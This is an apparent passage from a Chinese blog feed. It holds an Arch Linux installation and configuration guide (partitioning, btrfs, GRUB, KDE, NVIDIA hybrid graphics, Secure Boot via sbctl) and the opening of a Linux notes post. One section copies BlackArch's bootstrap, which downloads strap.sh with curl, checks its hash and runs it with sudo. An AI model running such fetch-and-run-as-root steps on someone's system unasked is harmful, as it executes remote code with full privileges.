中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # 华为开源镜像站</span><br><span class="line">Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # 兰州大学开源镜像站</span><br></pre></td></tr></table></figure><h3 id="分区和格式化">分区和格式化</h3><p>遇到的问题或想使用ext4分区请参考<a href="https://arch.icekylin.online/guide/rookie/basic-install-detail.html">ArchLinux简明指南</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk # 查看设备</span><br><span class="line">cfdisk /dev/sd_ </span><br></pre></td></tr></table></figure><p><font color=lightyellow>注意⚠️，cfdisk对于大小的设置是M和G而不是Mb和Gb，输入Mb和Gb也能识别但大小会有误，务必检查</font></p><p>cfdisk的界面完全是可读的。参考简明指南即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检查</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>格式化操作如下，如果和windows共存则不要格式化efi分区，以下操作都是对<strong>新</strong>空间操作的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#efi</span><br><span class="line">mkfs.fat -F32 /dev/sdxn #sata</span><br><span class="line">mkfs.fat -F32 /dev/nvmexn1pn # nvme</span><br><span class="line"></span><br><span class="line">mkswap /dev/sdxn #swap</span><br><span class="line"></span><br><span class="line">mkfs.btrfs -L MyArch /dev/sdxn #btrfs,-L是名字-label，无特殊字符和空格</span><br></pre></td></tr></table></figure><p>设置btrfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sdxn /mnt #挂载</span><br><span class="line"># 这是为了使用timeshift做准备，请尽可能严格按照这个分区命名和设置</span><br><span class="line">btrfs subvolume create /mnt/@ # 创建 / 目录子卷</span><br><span class="line">btrfs subvolume create /mnt/@home # 创建 /home 目录子卷</span><br><span class="line">btrfs subvolume list -p /mnt #检查</span><br><span class="line">umount /mnt</span><br><span class="line"># 挂载系统</span><br><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sdxn /mnt # 挂载 / 目录</span><br><span class="line">mkdir /mnt/home # 创建 /home 目录</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sdxn /mnt/home # 挂载 /home 目录</span><br><span class="line">mkdir -p /mnt/boot # 创建 /boot 目录</span><br><span class="line">mount /dev/sdxn /mnt/boot # 挂载 /boot 目录</span><br><span class="line">swapon /dev/sdxn # 挂载交换分区</span><br></pre></td></tr></table></figure><h3 id="安装系统">安装系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br><span class="line"># 如果使用btrfs文件系统，额外安装一个btrfs-progs包</span><br><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions # 其实bash也行</span><br><span class="line"></span><br><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line">cat /mnt/etc/fstab # 检查</span><br><span class="line"></span><br><span class="line">arch-chroot /mnt # 切换</span><br></pre></td></tr></table></figure><blockquote><p>💡Tips: 注意，在我们的系统无法启动什么也做不了的时候，同样可以用livecd的这个命令检查修复</p></blockquote><p>从这一步后，我们就进入了真正的系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # 输入主机名即可</span><br><span class="line">vim /etc/hosts #配置本地hosts如下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain myarch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 时区</span><br><span class="line">hwclock --systohc # 硬件同步时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen # 去掉enUS和zhCN 两个utf8的注释</span><br><span class="line">locale-gen</span><br><span class="line">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel 微码</span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><h3 id="grub引导">grub引导</h3><p>建议配置，grub引导比没有强，作者之前不用，u盘直插启动，内核参数相关的配置稍微繁琐一点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>配置grub参数需要：</p><ul class="lvl-0"><li class="lvl-2"><p>GRUB_CMDLINE_LINUX_DEFAULT内核参数去掉quiet，loglevel=5方便观察</p></li><li class="lvl-2"><p>加入nowatchdog（参考<a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_17-%E5%AE%89%E8%A3%85%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">这里</a>）</p></li><li class="lvl-2"><p>如果要配置n卡驱动怕等下遇到问题，可以提前加入ibt=off等</p></li><li class="lvl-2"><p>取消最后一行的GRUB_DISABLE_OS_PROBER=false注释，如果要引导win的话</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">exit # 退回安装环境</span><br><span class="line">umount -R /mnt # 卸载新分区</span><br><span class="line">reboot # 重启</span><br></pre></td></tr></table></figure><h3 id="重启后">重启后</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable --now NetworkManager</span><br><span class="line"># 无线：</span><br><span class="line">nmcli dev wifi list # 显示附近的 Wi-Fi 网络</span><br><span class="line">nmcli dev wifi connect &quot;Wi-Fi名（SSID）&quot; password &quot;网络密码&quot; # 连接指定的无线网络</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile #添加 export EDITOR=&#x27;vim&#x27;</span><br><span class="line">useradd -m -G wheel -s /bin/bash myusername</span><br><span class="line">passwd myusername</span><br><span class="line">EDITOR=vim visudo # 这里需要显式的指定编辑器，因为上面的环境变量还未生效</span><br><span class="line"># 取消注释这一行： </span><br><span class="line">#%wheel ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>开启pacman32位和archlinuxcn：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"># 去掉multilib注释</span><br><span class="line"># 添加（选一个也行）：</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinuxcn/$arch</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch # 中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://mirrors.hit.edu.cn/archlinuxcn/$arch # 哈尔滨工业大学开源镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinuxcn/$arch # 华为开源镜像站</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h1>更细节的设置命令</h1><h2 id="安装桌面和必备其他组件">安装桌面和必备其他组件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin # plasma-meta 元软件包、konsole 终端模拟器和 dolphin 文件管理器</span><br><span class="line">pacman -S  plasma-workspace xdg-desktop-portal egl-wayland</span><br><span class="line"># N卡用户需要额外安装egl-wayland,xdg-desktop-portal包是为了如obs此类工具录制屏幕使用</span><br><span class="line"># xdg-desktop-portal包组提供了不同环境下使用的软件包</span><br><span class="line"># 例如kde用户可选择xdg-desktop-portal-kde包</span><br><span class="line">systemctl enable sddm</span><br><span class="line">systemctl start sddm  # 或者重启reboot</span><br><span class="line"># n卡推荐x11启动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf # 声音固件</span><br><span class="line">sudo pacman -S ntfs-3g # 使系统可以识别 NTFS 格式的硬盘，双系统必装，win是ntfs</span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei # 安装几个开源中文字体。一般装上文泉驿就能解决大多 wine 应用中文方块的问题</span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra # 安装谷歌开源字体及表情</span><br><span class="line">sudo pacman -S ark # 压缩软件。在 dolphin 中可用右键解压压缩包</span><br><span class="line">sudo pacman -S gwenview # 图片查看器</span><br><span class="line">sudo pacman -S archlinuxcn-keyring # cn 源中的签名（archlinuxcn-keyring 在 archlinuxcn）</span><br><span class="line">sudo pacman -S yay # yay 命令可以让用户安装 AUR 中的软件（yay 在 archlinuxcn）</span><br></pre></td></tr></table></figure><h2 id="输入法">输入法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im # 输入法基础包组</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons # 官方中文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-anthy # 日文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl # 萌娘百科词库。二刺猿必备（archlinuxcn）</span><br><span class="line">sudo pacman -S fcitx5-material-color # 输入法主题</span><br></pre></td></tr></table></figure><p>编辑<code>~/.config/environment.d/im.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fix fcitx problem</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>更进一步的配置/更好用的输入法参见<a href="https://arch.icekylin.online/guide/advanced/optional-cfg-1#%F0%9F%8D%80%EF%B8%8F-%E8%BE%93%E5%85%A5%E6%B3%95">可选配置</a></p><h2 id="timeshift">timeshift</h2><p>pacman就行，参考<a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html">应用安装</a></p><h2 id="blackArch">blackArch</h2><p><a href="https://www.blackarch.org/downloads.html">官网</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Run https://blackarch.org/strap.sh as root and follow the instructions.</span><br><span class="line"></span><br><span class="line">$ curl -O https://blackarch.org/strap.sh</span><br><span class="line"># Verify the SHA1 sum</span><br><span class="line"></span><br><span class="line">$ echo bbf0a0b838aed0ec05fff2d375dd17591cbdf8aa strap.sh | sha1sum -c</span><br><span class="line"># Set execute bit</span><br><span class="line"></span><br><span class="line">$ chmod +x strap.sh</span><br><span class="line"># Run strap.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./strap.sh</span><br><span class="line"># Enable multilib following https://wiki.archlinux.org/index.php/Official_repositories#Enabling_multilib and run:</span><br><span class="line"></span><br><span class="line">$ sudo pacman -Syu</span><br></pre></td></tr></table></figure><h1>显卡驱动</h1><p>这里的所有内容只适用于iu+n卡，其他请参考archwiki或archlinux简明教程对应的部分。如果你也是同样配置并且需要笔记本双显卡，下面的内容可能会很管用。个人笔记本是y9000x 2022版本。</p><blockquote><p>这不一定适用于你的笔记本和显卡！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                  -`                    zjw1nd@MATRIX-02-B </span><br><span class="line">                 .o+`                   ------------------ </span><br><span class="line">                `ooo/                   OS: Arch Linux x86_64 </span><br><span class="line">               `+oooo:                  Host: 82TF Legion Y9000X IAH7 </span><br><span class="line">              `+oooooo:                 Kernel: 6.13.4-arch1-1 </span><br><span class="line">              -+oooooo+:                Uptime: 3 hours, 2 mins </span><br><span class="line">            `/:-:++oooo+:               Packages: 1033 (pacman) </span><br><span class="line">           `/++++/+++++++:              Shell: zsh 5.9 </span><br><span class="line">          `/++++++++++++++:             Resolution: 2560x1440 </span><br><span class="line">         `/+++ooooooooooooo/`           DE: Plasma 6.3.1 </span><br><span class="line">        ./ooosssso++osssssso+`          WM: KWin </span><br><span class="line">       .oossssso-````/ossssss+`         Theme: Breeze-Dark [GTK2], Breeze [GTK3] </span><br><span class="line">      -osssssso.      :ssssssso.        Icons: breeze-dark [GTK2/3] </span><br><span class="line">     :osssssss/        osssso+++.       Terminal: konsole </span><br><span class="line">    /ossssssss/        +ssssooo/-       Terminal Font: FiraCode Nerd Font 10 </span><br><span class="line">  `/ossssso+/:-        -:/+osssso+-     CPU: 12th Gen Intel i7-12700H (20) @ 4.600GHz </span><br><span class="line"> `+sso+:-`                 `.-/+oso:    GPU: Intel Alder Lake-P GT2 [Iris Xe Graphics] </span><br><span class="line">`++:.                           `-/+/   GPU: NVIDIA GeForce RTX 3060 Mobile / Max-Q </span><br><span class="line">.`                                 `/   Memory: 6705MiB / 39850MiB</span><br></pre></td></tr></table></figure><h2 id="首先，安装核显和n卡的驱动">首先，安装核显和n卡的驱动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></pre></td></tr></table></figure><p><font color=red>⚠️再次强调，英伟达的闭源驱动是和内核版本强绑定的，请一定在安装n卡驱动前执行pacman Syu操作！否则会出现很多意想不到的问题</font></p><p><strong>如果你不确定，则先不要执行下面的命令</strong>，先向后看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils # 必须安装</span><br><span class="line">nvidia-smi #检查，输出在gpu上工作的进程</span><br><span class="line">lspci | grep -i vga #检查，看你的显卡驱动，这个可以执行</span><br></pre></td></tr></table></figure><p>安装后，先将kms从<code>/etc/mkinitcpio.conf</code>里的HOOKS移除并重新生成initramfs,即<code>mkinitcpio -P</code>。这样可以避免initramfs包含nouveau。我个人的环境重装后执行到这里就可以了。</p><p>3060 mobile是一个很尬的版本。我个人在更新内核后直接安装了nvidia-open包就没问题了，但是过程中踩了一万个坑，现在，下面是一些备选的解决方法，我不确定哪些有用但提供在这里。同时建议n卡使用xorg显示服务器，n卡对wayland的支持并不算好，wayland主要是流畅动画和hdr，如果需要wayland则继续向后看。</p><ul class="lvl-0"><li class="lvl-2"><p>无论怎么装nvidia-smi都显示连接不到驱动——很可能是上面说的内核版本的问题</p></li><li class="lvl-2"><p>添加内核参数<code>ibt=off</code>，如果你使用了grub，则编辑<code>/etc/default/grub</code>中的内核参数<code>CMDLINE_DEFAULT</code>.如果没有，则参考archlinux wiki上的<a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">内核参数</a>页面进行配置，有很多办法。这是intel的一个间接跳转控制流保护机制，简单来说就是只允许<code>jmp rax</code>这样的指令在核态跳到标记过的位置。</p></li><li class="lvl-2"><p>安装后发现n卡驱动还是开源驱动nouveau——arch自带了开源驱动nouveau，才能点亮桌面的。n卡应该默认会屏蔽nouveau，如果没有可以卸载nouveau，并在内核参数中添加黑名单禁止nouveau的加载。内核启动参数添加<code>module_blacklist=nouveau</code>然后更新grub。或在<code>/etc/modprobe.d</code>中创建一个<code>blacklist.conf</code>，添加</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>同理，类似的思想可以用于很多地方，也可以反向让nouveau开启。</p><ul class="lvl-0"><li class="lvl-2"><p>如果你不是用的“linux”内核，而是linux-zen或者linux-lts，则安装对应驱动，将nvidia-open替换为<code>nvidia-open-lts,nvida-open-zen或nvidia-open-dkms</code>。需要注意的是，dkms包是一个不和内核绑定的驱动，在其他驱动遇到问题之后也可以再来尝试这个驱动。dkms需要内核对应的linuxheader，一般会作为依赖一起安装。</p></li><li class="lvl-2"><p>如果你需要Wayland，还需要启用两个nvidia_drm的两个内核参数：modeset和fbdev，二者在新的nvidia驱动包中被默认启用，但还是建议自己在内核参数添加一下。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/nvidia_drm/parameters/fbdev # 检查，失败返回缺少文件</span><br><span class="line">cat /sys/module/nvidia_drm/parameters/modeset # 正确返回Y</span><br></pre></td></tr></table></figure><p>以上都没能解决的话，更多的内容，可以参考archlinuxwiki上的<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA">NVIDIA</a>和<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">NVIDIA/故障排错</a></p><h2 id="双显卡配置">双显卡配置</h2><p>我个人使用了optimus-manager，所以推荐这个。envycontrol把我电脑整崩溃了所以个人不推荐，当然你也可以试试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl enable optimus-manager.service</span><br></pre></td></tr></table></figure><p>这时重启应该就能使用optimus-manager了。<br><font color=lightyellow>⚠️注意，如果你对你的环境没有自信（比如我），一定要在每次切换显卡完后手动注销一次观察是否正常再关机，不要切换后直接关机，否则可能会莫名其妙的黑屏</font>更多的与游戏运行，双显卡动态工作切换相关的可以参考<a href="https://arch.icekylin.online/guide/rookie/graphic-driver.html">简明指南</a></p><p>然后是电源策略，对于双显卡，如果不做手动电源策略配置，一般来说就算切换到集显模式，没有bios禁用独显的话，它也会一直工作耗电，很sb。因此需要我们配置optimus的电源策略。我个人尝试过的有两种，bbswitch策略在切换集显关机后再开tty2就黑屏了，我也不知道怎么修，tty3能用，反正刚装好没多久就重装了。</p><blockquote><p>重装是解决arch很多问题最快的方案（）</p></blockquote><p>对于电源策略，请参考optimus-manager的<a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">官方文档</a>，并且一定要<strong>看完</strong>。我采用的策略就是第一条，首先将optimus-manager的电源策略设置为custom,然后找到它的配置文件<code>/etc/optimus-manager/optimus-manager.conf</code>，将nvidia下的参数设置这一条<code>dynamic_power_management=fine</code>即可。这时，n卡自带的电源策略会根据其参数设置（fine: 短时间没有进程向gpu提交作业后进入低功耗；coarse: 没有应用使用n卡驱动后进入低功耗，参考<a href="https://github.com/Askannz/optimus-manager/blob/master/optimus-manager.conf">默认配置的注释</a>）降低自己的功耗，这时可以一直开hybrid模式。注意，这一功能需要n卡支持，请通过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/driver/nvidia/gpus/0000:01:00.0/power</span><br><span class="line"># Runtime D3 status: xxx会显示是否支持</span><br></pre></td></tr></table></figure><p>来查看是否支持。</p><p>这一方案自己的实测，nvidia-smi会显示显卡off，功率大概会降低到20w左右，没有完全关闭。不过配合TLP，基本上上课一个半小时跑linux基本不掉电，很无敌，薄纱windows。</p><p><font color=red>⚠️注意，电源策略是非常“个性化”的，需要尝试，请确保更改前做备份，或是保留了重装的livecd，我就是在bbswitch黑屏了重装的</font></p><h1>安全启动</h1><p>可以结合<a href="https://zjw1nd.github.io/2025/2/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">这篇</a>一起看</p><p>如果由于某些原因（指瓦洛兰特国际服反作弊vanguard）你需要平常开启安全启动，则可以参考这里。上面的blog中提供了自己手动签名内核并写入uefi的办法，</p><p>对于arch，有一个很好用的软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sbctl</span><br></pre></td></tr></table></figure><p><font color=lightyellow>⚠️注意，这一软件未必对所有的硬件环境都有效，可能仍然需要手动签名</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sbctl create-keys</span><br><span class="line">sbctl enroll-keys -m # 密钥和微软的一起登入uefi</span><br><span class="line">sbctl verify</span><br><span class="line">sbctl sign -s /boot/vmlinuz-linux</span><br><span class="line">sbctl sign -s /boot/EFI/BOOT/BOOTX64.EFI #  签署相关内容</span><br></pre></td></tr></table></figure><p>使用sbctl的好处是，其自带一个能够在内核更新后签署的pacmanhook，省事。</p><p>更多内容以及自己手动签名的细节操作，请参考ArchWiki的<a href="https://wiki.archlinuxcn.org/wiki/UEFI/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8">安全启动</a>部分。</p><h1>一些关键的配置：</h1><h2 id="grub">grub</h2><p>/etc/default/grub<br>更改后使用grub-mkconfig重新生成引导</p><h2 id="sddm">sddm</h2><p>默认在/etc/sddm.conf.d目录下</p><h2 id="pacman">pacman</h2><p>镜像 /etc/pacman.d/mirrorlist<br>配置 /etc/pacman.conf</p><h2 id="zsh-bash">zsh/bash</h2><p>~/.bashrc或.zshrc</p><h2 id="其他">其他</h2><p>第三方应用：/opt<br>自定义相关：/usr/share<br>systemctl 命令<br>mount命令用-o指定挂载参数，-t指定分区，用df -h查看挂载情况，fdisk -l查看磁盘情况</p><h1>通用排错</h1><h2 id="journalctl">journalctl</h2><p>journalctl命令可以输出systemd的日志，参考帮助参数，其可以输出很多东西，包括启动过程中的日志。</p><h2 id="Arch-LiveCD">Arch LiveCD</h2><p>用你的安装盘，其自带一个mini的arch系统，和我们安装时候做的一样，将主系统挂载到/mnt之后，可以在你的主系统翻车之后用其修复。我在尝试替换运行库的时候将一个低版本的libm.so.6放入了系统lib库（改名）结果全烂了，命令用不了加系统关机无法启动，直接插上liveCD改名后挂载改回来就行了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;首先的首先，最重要的参考来自于&lt;a href=&quot;https://arch.icekylin.online/guide/rookie/pre-install.html&quot;&gt;archlinux简明指南&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;h1&gt;写在前面&lt;/h1&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linux杂谈（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-02-24T08:26:14.000Z</published>
    <updated>2025-03-10T03:12:57.542Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。</p><h2 id="2023-11-26-linux文件系统根目录下那些都是干什么的？">2023.11.26 linux文件系统根目录下那些都是干什么的？</h2><p>参考<a href="https://www.runoob.com/linux/linux-system-contents.html">菜鸟教程</a>的内容。简单谈点理解。<br>“文件是对字节流的抽象。”而linux也是一个有着“一切皆文件”思想的系统。而无论是什么样的linux发行版，基本根目录下都是那几个文件夹。简单了解下这个文件系统以及它根目录下那些文件夹名字的含义。类似Program Files这种吧。</p><p>草文件系统好复杂，不当了不当linux高手了.jpg</p><h2 id="2024-3-关于linux安装、内核升级、显卡驱动、内核签名等小总结">2024.3 关于linux安装、内核升级、显卡驱动、内核签名等小总结</h2><p>自己花200买了个固态u盘，装一手linux，打算搞成一个平常用的环境。同时windows下装了kali的wsl版本，顺带升级了win11专业版。</p><p>看中省事的集成图形化界面+中文社区装了deepin，这个过程很简单，按照官方教程（有集成好的应用程序），一件配置安装就好了。<br>踩坑主要是显示方面的问题，个人笔记本一直开启的独显直连，最早的显卡驱动无法调节亮度，deepin源apt安装的话报错和内核的驱动版本版本不符，而且仍然无法调节亮度。各种踩坑就跳过，总之解决过程是去英伟达官网下载对应型号的生产环境闭源驱动后安装（退出图形化界面然后直接找到文件执行），参考<a href="https://bbs.deepin.org/zh/post/232923?offset=0&amp;postId=1317417">这篇文章</a>。安装好之后开启显卡的亮度调节，跳过不能用的方法，参考的<a href="https://bbs.deepin.org.cn/zh/post/257837">这篇</a>，conf文件中开启<code>EnableBrightnessControl=1</code>，也是挺幽默的。</p><p>然后自己编译升级了一下内核（能解决笔记本合盖待机无法唤醒的问题），新就是好（错乱）。内核编译参考<a href="https://linux.cn/article-16252-1.html">这篇文章</a>，说的非常详细了。但是拯救者无法识别自带音响和麦克风的问题似乎被忘记了…看到内核6.3版本的时候有大佬说这个问题和主板有关系，提交内核patch被拒绝了说这个问题已经在解决，可惜目前还没有，参考<a href="https://bbs.deepin.org/post/249003">这篇</a>（没什么用）和<a 